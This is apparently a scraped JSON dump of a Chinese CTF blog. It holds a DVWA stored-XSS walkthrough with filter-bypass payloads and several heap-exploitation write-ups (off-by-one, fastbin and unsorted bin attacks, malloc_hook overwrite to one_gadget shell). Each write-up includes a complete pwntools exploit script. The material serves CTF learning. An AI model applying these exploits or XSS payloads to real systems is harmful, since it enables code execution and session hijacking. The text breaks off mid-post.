mysql_real_escape_string( $name ); // Update database $query = \"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );\"; $result = mysql_query( $query ) or die( '&lt;pre&gt;' . mysql_error() . '&lt;/pre&gt;' ); //mysql_close();&#125;?&gt; 有关函数介绍: __trim(string, charlist)移除字符串两侧的空白字符或其它预定义字符，预定义字符包括\\t, \\n, \\x0b, \\r以及空格，可选参数charlist支持添加额外需要删除的字符。 stripslashes(string)删除字符串中的反斜杠 mysql_real_escape_string(string, connection)对字符串中的特殊符号 \\x00, \\n, \\r, , ‘, “, \\x1a 进行转义__ “INSERT INTO guestbook ( comment, name ) VALUES ( ‘$message’, ‘$name’);” mysql语句 往guestbook插入数据 上述代码没有对输入做XSS方面的过滤与检查，并且储存在数据库中，所以存在明显的存储型XSS漏洞 在Message一栏中输入 &lt;script&gt; alert(‘xss’) &lt;/script&gt; 就可以进行漏洞利用 wireshark有关知识:kali linux 中eth0 是对外网卡lo 是本地环合网卡? 对着这一栏点击右键 选择Dispaly Filter Expression 可以过滤不需要看的协议包之后点击左上角的红色方框停止抓取流量，点击File -&gt; save 保存为pcapng文件 burp2.1.07 有关知识:Project -&gt; 项目名称 -&gt; 恢复默认值 -&gt; All 可恢复全部默认配置 设置编码集用户选项 -&gt; 表示 -&gt; 字符集 -&gt; 设置编码集为UTF-8 项目名称更改Project -&gt; 更改名称 Repeater 模块选中抓取的包 -&gt; 右键 -&gt; 发送给Repeater -&gt; 点击高亮的Repeater模块 -&gt; 左上角的send按钮 -&gt; 右边会出现时相应内容 这里对name的输入也有长度限制，可以利用burp suite转包把name 改位&lt;script&gt; alert(‘name’) &lt;/script&gt; 2. medium 123456789101112131415161718&lt;?phpif( isset( $_POST[ 'btnSign' ] ) ) &#123; // Get input $message = trim( $_POST[ 'mtxMessage' ] ); $name = trim( $_POST[ 'txtName' ] ); // Sanitize message input $message = strip_tags( addslashes( $message ) ); $message = mysql_real_escape_string( $message ); $message = htmlspecialchars( $message ); // Sanitize name input $name = str_replace( '&lt;script&gt;', '', $name ); $name = mysql_real_escape_string( $name ); // Update database $query = \"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );\"; $result = mysql_query( $query ) or die( '&lt;pre&gt;' . mysql_error() . '&lt;/pre&gt;' ); //mysql_close();&#125;?&gt; 相关函数说明:strip_tags() 函数剥去字符串中的HTML、XML以及PHP的标签，但允许使用&lt;b&gt;标签.addslashes() 函数返回在预定义字符(单引号，双引号，反斜杠，NULL) 之前添加反斜杠的字符串 上述代码对message参数进行了过滤， 无法通过message 注入XSS代码，但是对于name参数可以利用前面的双写绕过与大小写绕过 3. high 123456789101112131415161718&lt;?phpif( isset( $_POST[ 'btnSign' ] ) ) &#123; // Get input $message = trim( $_POST[ 'mtxMessage' ] ); $name = trim( $_POST[ 'txtName' ] ); // Sanitize message input $message = strip_tags( addslashes( $message ) ); $message = mysql_real_escape_string( $message ); $message = htmlspecialchars( $message ); // Sanitize name input $name = preg_replace( '/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $name ); $name = mysql_real_escape_string( $name ); // Update database $query = \"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );\"; $result = mysql_query( $query ) or die( '&lt;pre&gt;' . mysql_error() . '&lt;/pre&gt;' ); //mysql_close();&#125;?&gt; message 不可利用， 但是name参数可以通过img, ifram等其它危险的标签 注入XSS代码 4. impossiblename 与 message参数 都是使用了htmlspecialchars函数，无法利用XSS，但是如果htmlspecialchars函数使用不当，攻击者就可以通过编码的方式绕过函数进行XSS注入，尤其是DOM型的XSS。（目前未接触）","tags":[{"name":"XSS, DVWA","slug":"XSS-DVWA","permalink":"http://wafuter.jxustctf.top/tags/XSS-DVWA/"}]},{"title":"Hgame Eggplant_note write up","date":"2020-03-17T08:07:11.000Z","path":"2020/03/17/Hgame-Eggplant-note-write-up/","text":"不是很有心情啃难题，就日常水博客了… 漏洞点 比较明显的 off-by-one 漏洞利用保护全开， 有个off-by-one漏洞，关于note的操作都齐了， 那么做法就比较常规了 通过off-by-one漏洞修改 chunk 的size，再通过其它操作是unsorted bin中的 chunk 与 heap中的chunk重叠造成 chunk overlap， 之后就是泄露libc地址与 fast bin attack了 exp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374from pwn import *import sysimport oscontext(arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h'])#context(arch='i386', os='linux', terminal=['tmux', 'splitw', '-h'])context.log_level='debug'debug = 1def pwn(): execve = \"./Eggplant_note\" if debug == 1: p = process(execve) if sys.argv[1] == '1': gdb.attach(p) else: #ip = \"10.0.%s.140\" % sys.argv[1] ip = \"\" host = \"\" p = remote(ip, host) def add(size, content): p.sendlineafter(\":\", str(1)) p.sendlineafter(\"size?\", str(size)) p.sendafter(\"content:\", content) def free(idx): p.sendlineafter(\":\", str(2)) p.sendlineafter(\"index?\", str(idx)) def show(idx): p.sendlineafter(\":\", str(3)) p.sendlineafter(\"index?\", str(idx)) def edit(idx, content): p.sendlineafter(\":\", str(4)) p.sendlineafter(\"index?\", str(idx)) p.sendafter(\"content:\", content) add(0x18, '\\n') # 0 add(0x18, '\\n') # 1 add(0x68, '\\n') # 2 add(0x48, '\\n') # 3 edit(0, '\\x00'*0x18 + '\\x91') free(1) add(0x18, '\\n') # 1 add(0x68, '&gt;'*7 + '\\n') # 4 show(4) libc = ELF(\"/lib/x86_64-linux-gnu/libc-2.23.so\") p.recvuntil('&gt;'*7) leak = u64(p.recv(7)[1:].ljust(8, '\\x00')) libc_base = leak - (0x7fcb51a67b78 - 0x7fcb516a3000) malloc_hook = libc_base + libc.symbols['__malloc_hook'] realloc = libc_base + libc.symbols['__libc_realloc'] one_gadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147] log.success(\"libc_base -&gt; \" + hex(libc_base)) free(4) edit(2, p64(malloc_hook - 0x23) + '\\n') add(0x68, '\\n') add(0x68, '\\x00'*0x13 + p64(libc_base+one_gadget[3]) + '\\n') log.info(\"one_gadget -&gt; \" + hex(libc_base + one_gadget[3])) p.sendlineafter(\":\", str(1)) p.sendlineafter(\"size?\", str(1)) p.interactive()if __name__ == '__main__': pwn() 结果:","tags":[{"name":"Hgame2020， chunk overlap","slug":"Hgame2020，-chunk-overlap","permalink":"http://wafuter.jxustctf.top/tags/Hgame2020%EF%BC%8C-chunk-overlap/"}]},{"title":"2019护网杯 flower复现","date":"2020-03-14T14:21:17.000Z","path":"2020/03/14/2019护网杯-flower复现/","text":"学习的是Ex师傅的博客http://blog.eonew.cn/archives/1212 漏洞点 这里有个null by one 漏洞 由于程序限制的v2的大小只能小于等于0x58, 所以就不能通过常规的的方法分配chunk到unsorted中泄露libc地址， 通过伪造0x7fsize的chunk来进行fast bin attack， 这里触及到我的知识盲区了 利用scanf使fast bin中的chunk合并进入unsorted bin当 top_chunk 不够时， 或者申请了一个 large bin, 也就是size大于0x400的 chunk 就能触发 malloc_consolidate， 使得 fast bin 合并，并且放入 unsorted bin中. 这里用到了一个缓冲机制，当 scanf 的缓冲区不够用时， 就会 malloc 一块更大的chunk来充当缓冲区， 然后使用完之后再 free 掉， 当输入大于 0x400 时， 会申请一块大于 0x400 的 chunk 来当缓冲区, 正是这个申请可以触发 malloc_consolidate 解题思路1.利用 scanf 的缓冲机制， 使输入的长度大于0x400, 那么就会触发malloc_solidate来时fast bin中的 chunk 合并进入unsortedbin中， 后续便可以泄露libc地址 2.泄露了libc地址 要考虑的就是如何覆写malloc_hook， 既然无法利用 fastbin attack ， 那么可以考虑利用改写 top_chunk 为 malloc_hook附近的地址， 难点在于 如何构造 chunk overlap 构造chunk overlap前面已经使fast bin中的 chunk 合并进入 unsorted bin 中了， 那么可以先申请一个大小为chunk， 填满data区， 使得下一个chunk的size的低位字节被覆盖成’\\x00’, 后续再分配几个 chunk , 为了后面的chunk overlap做准备 12345678910111213141516for i in range(6): add(0x58, i, '\\n')for i in range(5): free(i)add(0x28, '4', '\\n')p.sendlineafter(\"choice &gt;&gt;\", '0'*0x400) //触发malloc_solidateadd(0x58, 0, '\\x00'*0x58) //将下一个chunk的sie的低位字节置为零创造一个大小为0x100的chunkadd(0x18, 1, '111')add(0x50, 2, '222')add(0x38, 3, '333')free(1) // 这两个free语句为后续的malloc_solidate创造一个新的合并的fastbin的chunkfree(5) // 方便后续 chunk overlap(堆块重叠)p.sendlineafter(\"choice &gt;&gt;\", '0'*0x400) 改写top_chunk准备好 chunk overlap 的条件后就是改写 top_chunk了， 总之先泄露libc地址， 之后利用 chunk overlap往fast bin中的chunk 写入main_arena的地址， 这个地址需要实现free一个chunk， 这样中main_arena就会存在一个0x55xxxx…的地址(对应fastbin 链表的表头指针)， 开头字节0x55就是我们需要伪造的chunk的size 写入成功后将分配 chunk 到main_arena中，覆盖 top_chunk 为 &lt;_IO_wide_data_0+296&gt; 处的地址， 为什么是这个地址？ 因为这个地方有一个 天然的size 覆盖成功后再分配几个 chunk 将unsorted bin中的chunk清空， 之后从 top_chunk 分配的时候将one_gadget与realloc的地址写入就可以getshell了 exp12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697from pwn import *import sysimport oscontext(arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h'])#context(arch='i386', os='linux', terminal=['tmux', 'splitw', '-h'])context.log_level='debug'debug = 1def pwn(): execve = \"./flower\" if debug == 1: p = process(execve) if sys.argv[1] == '1': gdb.attach(p) else: #ip = \"10.0.%s.140\" % sys.argv[1] ip = \"\" host = \"\" p = remote(ip, host) def add(size, idx, name): p.sendlineafter(\"choice &gt;&gt;\", str(1)) p.sendlineafter(\"Name of Size : \", str(size)) p.sendlineafter(\"input index: \", str(idx)) p.sendafter(\"input flower name:\", name) def free(idx): p.sendlineafter(\"choice &gt;&gt;\", str(2)) p.sendlineafter(\"input idx :\", str(idx)) def show(idx): p.sendlineafter(\"choice &gt;&gt;\", str(3)) p.sendlineafter(\"Input idx :\", str(idx)) for i in range(6): add(0x58, i, '\\n') for i in range(5): free(i) add(0x28, '4', '\\n') p.sendlineafter(\"choice &gt;&gt;\", '0'*0x400) add(0x58, 0, '\\x00'*0x58) add(0x18, 1, '111') add(0x50, 2, '222') add(0x38, 3, '333') free(1) free(5) p.sendlineafter(\"choice &gt;&gt;\", '0'*0x400) add(0x48, 1, '1234567' + '\\n') add(0x48, 5, '444') add(0x58, 0, '\\x05\\x05\\x05') show(1) p.recvuntil(\"1234567\\x0a\") leak = u64(p.recv(6).ljust(8, '\\x00')) libc_base = leak - (0x7fae97541d48 - 0x7fae9717d000) log.success(\"libc_base -&gt; \" + hex(libc_base)) free(5) free(2) free(4) main_arena = libc_base + 0x3c4b20 log.success(\"main_arena -&gt; \" + hex(main_arena)) add(0x58, 2, '\\x00'*0x28 + p64(0x51) + p64(main_arena + 0xd) + '\\n') add(0x48, 2, '\\n') add(0x48, 2, '\\x00' * 0x3b + p64(main_arena - 0x28)) log.success(\"fake_addr -&gt; \" + hex(main_arena - 0x28)) log.success(\"main_arena -&gt; \" + hex(main_arena)) try: libc = ELF(\"/lib/x86_64-linux-gnu/libc-2.23.so\") add(0x50, 2, '\\n') add(0x50, 2, '\\n') raw_input() add(0x50, 2, p64(libc_base + 0xf1147) + p64(libc_base + libc.symbols['__libc_realloc'] + 20)) raw_input() p.sendlineafter(\"choice &gt;&gt;\", str(1)) p.sendlineafter(\"Name of Size : \", str(1)) p.sendlineafter(\"input index: \", str(1)) except EOFError: p.close() pwn() p.interactive()if __name__ == '__main__': pwn() 结果： 再记录一下遇到的坑 在考虑改写 top_chunk 的时候想过直接往main_arena中写入0x61, 这样就能直接分配了不用额外free chunk和考虑概率的问题， 但是在最后一步的时候要覆盖 realloc_hook和malloc_hook 的时候会在 &lt;malloc_solidate+296&gt; 这个地方报错 显示的是错误的地址 0x69, 观察了一下寄存器， rbx的寄存器的值为 0x61, 刚好就是写入 main_arena的数值， 不知道什么原因就跟着Ex师傅的博客的思路区复现了","tags":[{"name":"2019护网杯， malloc_consolidate","slug":"2019护网杯，-malloc-consolidate","permalink":"http://wafuter.jxustctf.top/tags/2019%E6%8A%A4%E7%BD%91%E6%9D%AF%EF%BC%8C-malloc-consolidate/"}]},{"title":"结合2019 省赛题目 lllheap 对unlink的初步理解","date":"2020-03-13T07:35:47.000Z","path":"2020/03/13/unlink原理-初步理解/","text":"small bin中的 unlinkunlink 就是chunk在解链时会进行的一个操作, 设要触发unlink的chunk的地址为p， 指向这个chunk的地址为ptr 12345FD = p-&gt;fd;BK = p-&gt;bk;FD-&gt;bk = BK;BK-&gt;fd = FD; 但是要利用unlink 还需要绕过两个保护 检查大小12if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0)) malloc_printerr (\"corrupted size vs. prev_size\"); 如果 要触发unlink的chunk 的下一个chunk的prev_size 不符合 要触发unlink的chunk 的size的则会报出corrupted size vs. prev_size 错误 检查FD-&gt;bk == p &amp;&amp; BK-&gt;fd == p12if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)) malloc_printerr (\"corrupted double-linked list\"); 如何绕过这两个保护1.绕过大小保护 通常可以通过堆溢出 或 null by one来伪造chunk来绕过大小保护 2.绕过链接关系检查 从这开始-&gt;表示指向关系, 不代表结构体指针的-&gt; 根据假设情况有 ptr -&gt; p再具体一点假设ptr = 0x602070 为bss段的某个地址， 存放要触发unlink的chunk的地址 p = 0x20f4000 为要触发unlink的chunk的地址 由于要绕过链接关系检查， 那么要控制FD-&gt;bk == p 以及 BK-&gt;fd == p p的fd与bk指针 均指向chunk头地址 -&gt; prev_size | size fd | bk … prev_size | size 那么 12345FD = p-&gt;fd = *(p + 0x10)BK = p-&gt;bk = *(p + 0x18)FD-&gt;bk 等价于 *( *(p + 0x10) + 0x18)BK-&gt;fd 等价于 *( *(p + 0x18) + 0x10) 如果控制FD = p-&gt;fd = ptr - 0x18BK = p-&gt;bk = ptr - 0x10那么FD-&gt;bk = *( ptr - 0x18 + 0x18) = pBK-&gt;fd = *( ptr - 0x10 + 0x10) = p 这样就达成了目的， 成功绕过了链接关系检查 进行unlink绕过前面两个检查后就会进行unlink了 12FD-&gt;bk = BKBK-&gt;fd = FD 根据前面伪造的fd与bk指针， 上面的操作等同于 *( ptr - 0x18 + 0x18) = ptr - 0x10;*( ptr - 0x10 + 0x10) = ptr - 0x18; 最终会往ptr 中写入 ptr - 0x18 这样再lllheap 这道题目中就可以结合edit函数 改变存放在bss 段的chunk地址为malloc_hook的地址， 再利用edit函数往malloc_hook 写入one_gadget来getshell 相关链接:https://blog.csdn.net/qq_43189757/article/details/103483140","tags":[{"name":"unlink","slug":"unlink","permalink":"http://wafuter.jxustctf.top/tags/unlink/"}]},{"title":"XCTF 新春战疫 woodenbox2 writeup && easyheap 复现","date":"2020-03-10T07:00:35.000Z","path":"2020/03/10/XCTF-新春战疫-woodenbox2-writeup-easyheap-复现/","text":"easyheap 复现 漏洞点在add函数中，如果输入的size大于1024的话那么就只会malloc一个大小为0x20的chunk， 不会进行后续的操作 如何利用？ add函数中创建的结构为 1234struct node &#123; struct node \\*content; int size;&#125; 固定的malloc(0x10) 用来存放node节点后面的malloc(nbytes) 是node.content 如果可以控制某个node的content指针指向其它某个chunk，那么就可以控制那个chunk的content指针再配合edit函数可以造成任意地址写， 有了任意地址写那么第一步就是改写free函数的got表为puts的plt表泄露出libc地址， 第二步改写atoi函数的got表为system的地址， 随后输入/bin/sh即可getshell 再补充一个以前没有注意到的知识点, 在fast bin中的链表中，当有chunk从fast bin中取出来的时候这个chunk的fd和bk指针不会改变 exp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283from pwn import *import sysimport oscontext(arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h'])#context(arch='i386', os='linux', terminal=['tmux', 'splitw', '-h'])context.log_level='debug'debug = 1def pwn(): execve = \"./easyheap\" if debug == 1: p = process(execve) if sys.argv[1] == '1': gdb.attach(p) else: #ip = \"10.0.%s.140\" % sys.argv[1] ip = \"\" host = \"\" p = remote(ip, host) def add(size, content): p.sendlineafter(\"Your choice:\", str(1)) p.sendlineafter(\"How long is this message?\", str(size)) p.sendafter(\"What is the content of the message?\", content) def addNoContent(size): p.sendlineafter(\"Your choice:\", str(1)) p.sendlineafter(\"How long is this message?\", str(size)) def free(idx): p.sendlineafter(\"Your choice:\", str(2)) p.sendlineafter(\"What is the index of the item to be deleted?\", str(idx)) def edit(idx, content): p.sendlineafter(\"Your choice:\", str(3)) p.sendlineafter(\"What is the index of the item to be modified?\", str(idx)) p.sendafter(\"What is the content of the message?\", content) elf = ELF(\"./easyheap\") libc = ELF(\"./xctf_eh_libc.so.6\") free_got = elf.got['free'] puts_plt = elf.plt['puts'] add(0x18, p64(0xf0)*3) #0 free(0) addNoContent(0x500) #0.node add(0x18, p64(free_got)) # 1 -&gt; 0.content free(1) addNoContent(0x500) # 1.node -&gt; 0.content add(0x18, '\\n') # 2 edit(1, p64(0) + p64(0x21) + p64(free_got)) edit(2, p64(puts_plt)) edit(1, p64(0) + p64(0x21) + p64(elf.got['puts'])) free(2) p.recvline() leak = u64(p.recv(6).ljust(8, '\\x00')) libc_base = leak - (0x7f657bccc690 - 0x7f657bc5d000) log.info(\"libc_base -&gt; \" + hex(libc_base)) edit(0, p64(0) + p64(0x21) + p64(elf.got['atoi'])) edit(1, p64(libc_base + libc.symbols['system'])) p.sendlineafter(\"Your choice:\", '/bin/sh\\0') p.interactive()if __name__ == '__main__': pwn() 复现成功: woodenbox2 wirteup 此处重新输入的size没有作限制， 所以有了很方便的堆溢出， 但是由于程序中没有show之类的函数， 所以需要控制IO_2_1_stdout_结构体来泄露libc地址， 可以利用堆溢出使一个chunk即位于fast bin中又位于unsorted bin中， 之后再控制chunk的fd指针的低两个字节为’\\xdd\\x25’, 但是由于地址随机化的原因1/16的概率可以成功， 泄露libc地址后就是常规的fast bin attack 了 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879from pwn import *import sysimport oscontext(arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h'])#context(arch='i386', os='linux', terminal=['tmux', 'splitw', '-h'])context.log_level='debug'debug = 1def pwn(): execve = \"./woodenbox2\" if debug == 1: p = process(execve) if sys.argv[1] == '1': gdb.attach(p) else: #ip = \"10.0.%s.140\" % sys.argv[1] ip = \"121.36.215.224\" host = \"9998\" p = remote(ip, host) def add(size, content): p.sendlineafter(\"Your choice:\", str(1)) p.sendlineafter(\"Please enter the length of item name:\", str(size)) p.sendafter(\"Please enter the name of item:\", content) def edit(idx, size, content): p.sendlineafter(\"Your choice:\", str(2)) p.sendlineafter(\"Please enter the index of item:\", str(idx)) p.sendlineafter(\"Please enter the length of item name:\", str(size)) p.sendlineafter(\"Please enter the new name of the item:\", content) def free(idx): p.sendlineafter(\"Your choice:\", str(3)) p.sendlineafter(\"Please enter the index of item:\", str(idx)) add(0x68, '\\n') #0 add(0x18, '\\n') #1 add(0x68, '\\n') #2 add(0x68, '\\n') #3 -&gt; 1 edit(0, 0x90, '\\x00'*0x68 + p64(0x91) + '\\n') edit(2, 0x90, p64(0x21)*2*6) free(1) free(1) add(0x18, '\\n') # -&gt; 0 edit(0, 0x22, '\\x00'*0x18 + p64(0x71) + '\\xdd\\x25') add(0x68, '\\n') # -&gt; 2 add(0x68, '\\x00'*0x33 + p64(0xfbad1800) + p64(0)*3 + '\\x00') # -&gt; 3 elf = ELF(\"./woodenbox2\") libc = ELF(\"libc6_2.23-0ubuntu11_amd64.so\") p.recvuntil(p64(0xfbad1800)) p.recv(24) leak = u64(p.recv(6).ljust(8, '\\x00')) libc_base = leak - (0x7ffff7dd2600 - 0x7ffff7a0d000) malloc_hook = libc_base + libc.symbols['__malloc_hook'] realloc = libc_base + libc.symbols['__libc_realloc'] one_gadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147] log.info(\"libc_base -&gt; \" + hex(libc_base)) add(0x68, '\\n') # -&gt; 4 add(0x68, '\\n') # -&gt; 5 add(0x68, '\\n') # -&gt; 6 free(5) edit(3, 0xf0, '\\x00'*0x68 + p64(0x71) + '\\x00'*0x68 + p64(0x71) + p64(malloc_hook - 0x23) + '\\n') add(0x68, '\\n') add(0x68, '\\x00'*(0x13 - 8) + p64(libc_base + one_gadget[1]) + p64(realloc + 6)) p.sendlineafter(\"Your choice:\", str(1)) p.sendlineafter(\"Please enter the length of item name:\", str(0x20)) p.interactive()if __name__ == \"__main__\": pwn() flag:","tags":[{"name":"IO_2_1_stdout, fast bin","slug":"IO-2-1-stdout-fast-bin","permalink":"http://wafuter.jxustctf.top/tags/IO-2-1-stdout-fast-bin/"}]},{"title":"Hgame 2020 第三周 Annevi writeup","date":"2020-03-06T08:29:43.000Z","path":"2020/03/06/Hgame-2020-第三周-Annevi-writeup/","text":"漏洞点 1.由于read函数在判断 i &lt; a2 之前， 所以可以多输入一位， 存在off-by-one漏洞2.在edit函数中 能输入的数据长度固定是256， 只要创建大小小于0x100的chunk 就可以造成堆溢出 解题思路:1.首先泄露libc地址可以利用off-by-one或堆溢出 修改下一个chunk的size， 修改的size小于原来的size， free掉这个chunk后，在add一个chunk 使得在unsorted bin中剩余的chunk的size等于被修改的chunk的下一个chunk的size， 之后再调用show函数即可泄露libc地址 2.由于程序中限制了add的chunk的大小只能大于0x90, 所以没办法直接利用fast bin attack控制malloc_hook 与realloc_hook我的想法是改global_max_fast 为一个很大的数， 之后free的chunk都会被归为fast bin中unsorted bin attack简单介绍:如果控制了unsorted bin中的bk指针， 之后往unsotred bin中取出chunk的时候 会执行这样一条指令bck-&gt;fd = unsorted_chunks (av);这样就可以往bk指向的内存中写入一个很大的数 改写完global_max_fast之后先利用一次 fast bin attack 往malloc_hook上方写入一个0xf1作为跳板(mall0c_hook上方存在 0xffffffffffffffff)， 再第二次利用fast bin attack中跳到第一次伪造的fake_chunk处， 之后就可以覆盖realloc_hook 与malloc_hook了 3.由于one_gadget全部失效， 需要realloc来调整栈环境 要注意的是0xffffffffffffffff 的下方有两个地址也要利用偏移求的， 不要用其它数据覆盖，以前随便覆盖的时候好像出错了.. exp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495from pwn import *import sysimport oscontext(arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h'])#context(arch='i386', os='linux', terminal=['tmux', 'splitw', '-h'])context.log_level='debug'debug = 1def pwn(): execve = \"./Annevi\" if debug == 1: p = process(execve) if sys.argv[1] == '1': gdb.attach(p) else: #ip = \"10.0.%s.140\" % sys.argv[1] ip = \"\" host = \"\" p = remote(ip, host) def add(size, content): p.sendlineafter(\":\", str(1)) p.sendlineafter(\"size?\", str(size)) p.sendafter(\"content:\", content) def free(idx): p.sendlineafter(\":\", str(2)) p.sendlineafter(\"index?\", str(idx)) def show(idx): p.sendlineafter(\":\", str(3)) p.sendlineafter(\"index?\", str(idx)) def edit(idx, content): p.sendlineafter(\":\", str(4)) p.sendlineafter(\"index?\", str(idx)) p.sendafter(\"content:\", content) add(0x98, '\\x00' + '\\n') #0 add(0x98, '\\x00' + '\\n') #1 add(0x98, p64(0x21)*2*9 + '\\n') #2 add(0xe8, '\\n') #3 add(0xe8, '\\n') #4 add(0xd8, '\\n') #5 add(0xe8, '\\n') #6 edit(0, '\\x00'*0x98 + p64(0xf1) + '\\n') free(1) add(0x98, '\\x00' + '\\n') #1 show(2) elf = ELF(\"./Annevi\") libc = ELF(\"/lib/x86_64-linux-gnu/libc-2.23.so\") p.recvuntil(\"content:\") leak = u64(p.recvline()[:-1].ljust(8, '\\x00')) libc_base = leak - (0x7fe8dc04eb78 - 0x7fe8dbc8a000) malloc_hook = libc_base + libc.symbols['__malloc_hook'] realloc = libc_base + libc.symbols['__libc_realloc'] one_gadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147] global_max_fast = libc_base + 0x3c67f8 log.info(\"global_max_fast -&gt; \" + hex(global_max_fast)) log.info(\"libc_base -&gt; \" + hex(libc_base)) edit(2, p64(global_max_fast) + p64(global_max_fast - 0x10) + '\\n') edit(1, '\\x00'*0x98 + p64(0xa1) + '\\n') add(0x98, '\\n') # 7 modify global_max_fast fake_chunk = libc_base + 0x3c496f addr1 = libc_base + 0x3c49c0 addr2 = libc_base + 0x3c36e0 free(3) edit(2, '\\x00'*0x98 + p64(0xf1) + p64(fake_chunk) + '\\n') log.info(\"fake_chunk -&gt; \" + hex(fake_chunk)) add(0xe8, '\\n') # 3 add(0xe8, '\\n') # 8 edit(8, '\\x00' + p64(addr1) + p64(0)*6 + p64(addr2) + '\\x00' + '\\x00'*0xa6 + p64(0xe1) + '\\n') fake_chunk2 = libc_base + 0x3c4a5f free(5) edit(4, '\\x00'*0xe8 + p64(0xe1) + p64(fake_chunk2) + '\\n') add(0xd8, '\\n') #4 add(0xd8, '\\x00'*(0xa1 - 8) + p64(libc_base + one_gadget[1]) + p64(realloc + 8) + '\\n') log.info(\"one_gadget -&gt; \" + hex(libc_base + one_gadget[3])) #raw_input() p.sendlineafter(\":\", str(1)) p.sendlineafter(\"size?\", str(0x90)) p.interactive()if __name__ == '__main__': pwn() 结果:","tags":[{"name":"unsorted bin attack, 修改global_max_fast","slug":"unsorted-bin-attack-修改global-max-fast","permalink":"http://wafuter.jxustctf.top/tags/unsorted-bin-attack-%E4%BF%AE%E6%94%B9global-max-fast/"}]},{"title":"v&n 招新赛 simpleHeap writeup(未成功)","date":"2020-03-04T13:52:36.000Z","path":"2020/03/04/v-n-招新赛-simpleHeap-writeup-未成功/","text":"这题我真是裂开了 先是没看清ubuntu的版本， 以为是ubuntu18的， 然后按照tcache bin的libc去做， 最后终于写出exp， 将malloc_hook与realloc_hook成功覆盖， 之后不知道为什么总会在printf中程序崩溃.., 无法执行到malloc也就无法攻击, 实在找不出原因后去找wp， 看到fast binattack满头问号， 之后再去看题目发现是libc2.23.., 是libc2.23 的话就比libc2.27 简单多了 然而当我又一次写出exp的时候，又成功把realloc_hook与malloc_hook 给覆盖了， 最后运行的时候还是在call printf 的过程中程序崩溃.., 之后试了直接打远程， 跟本地是一样的情况， 那么只能是我的操作问题了， 或许是某个不好的习惯， 但实在找不出来了， 只能先鸽了，先把经验写了 2.23 在ubuntu18 中编写exp中碰到的问题总结1.如果 某个chunk在unsortedbin 与tcache bin中同时存在， 那么在malloc的时候会先取tcache bin中的chunk2.x/i 命令查看汇编指令3.tcache bin 中的chunk不会作size检查， 所以只创建一个chunk符合tcache bin的大小的话会直接进入tcache bin中， 但如果符合unsorted bin中的话就要伪造chunk使其不会与 top_chunk 合并了4.tcache bin 存放的chunk 指针 是data区的指针 realloc函数的部分汇编指令 本题解题思路漏洞： 存在明显的off-by-one漏洞 思路：那么只要利用off-by-one 溢出一个字节修改下一个chunk的size符合unsorted bin中的大小， 在free掉即可leak出libc地址，要注意的是不要让这个fake size与 top_chunk合并, 之后让这个fake chunk 同时存在于 unsorted bin 于fast bin中， 这样就可以修改fast bin中的chunk的fd指针， 之后就是fast bin attack 覆盖malloc_hook 失败的exp: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879from pwn import *import sysimport os#context(arch='i386', os='linux', terminal=['tmux', 'splitw', '-h'])context(arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h'])context.log_level = 'debug'debug = 1exceve = \"./vn_pwn_simpleHeap\"def pwn(): if debug == 1: p = process(exceve) if sys.argv[1] == '1': gdb.attach(p) else: ip = \"node3.buuoj.cn\" port = \"27552\" p = remote(ip, port) def add(size, content): p.sendlineafter(\"choice: \", str(1)) p.sendlineafter(\"size?\", str(size)) p.sendafter(\"content:\", content) def edit(idx, content): p.sendlineafter(\"choice: \", str(2)) p.sendlineafter(\"idx?\", str(idx)) p.sendafter(\"content:\", content) def show(idx): p.sendlineafter(\"choice: \", str(3)) p.sendlineafter(\"idx?\", str(idx)) def free(idx): p.sendlineafter(\"choice: \", str(4)) p.sendlineafter(\"idx?\", str(idx)) add(0x38, '\\x00') #0 add(0x38, '\\x00') #1 add(0x68, '\\x00') #2 add(0x21, '\\x00') #3 edit(0, '\\x00'*0x38 + '\\xB1') free(1) add(0x38, '\\x00') # 1 show(2) elf = ELF(\"./vn_pwn_simpleHeap\") libc = ELF(\"/lib/x86_64-linux-gnu/libc-2.23.so\") leak = u64(p.recvline()[:-1].ljust(8, '\\x00')) libc_base = leak - (0x7feecccdeb78 - 0x7feecc91a000) malloc_hook = libc_base + libc.symbols['__malloc_hook'] realloc = libc_base + libc.symbols['__libc_realloc'] one_gadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147] add(0x68, '\\x00') # 4 free(4) edit(2, p64(malloc_hook - 0x23) + '\\n') add(0x68, '\\x00') #4 add(0x68, '\\x00') #5 edit(5, '\\x00'*(0x13 - 8) + p64(libc_base + one_gadget[1]) + p64(realloc) + '\\n') log.info(\"libc_base -&gt; \" + hex(libc_base)) log.info(\"realloc -&gt; \" + hex(realloc)) log.info(\"one_gadget -&gt;\" + hex(libc_base + one_gadget[0])) raw_input() p.sendlineafter(\"choice: \", str(1)) p.sendlineafter(\"size?\", str(0x38))if __name__ == '__main__': pwn()","tags":[{"name":"pwn, off-by-one","slug":"pwn-off-by-one","permalink":"http://wafuter.jxustctf.top/tags/pwn-off-by-one/"}]},{"title":"v&n招新赛 easyTHeap 复现","date":"2020-03-01T16:42:48.000Z","path":"2020/03/02/v-n招新赛-easyTHeap-复现/","text":"程序逻辑分析： 堆题， 对于堆的基本操作都有了， 但是作了比较多的限制， 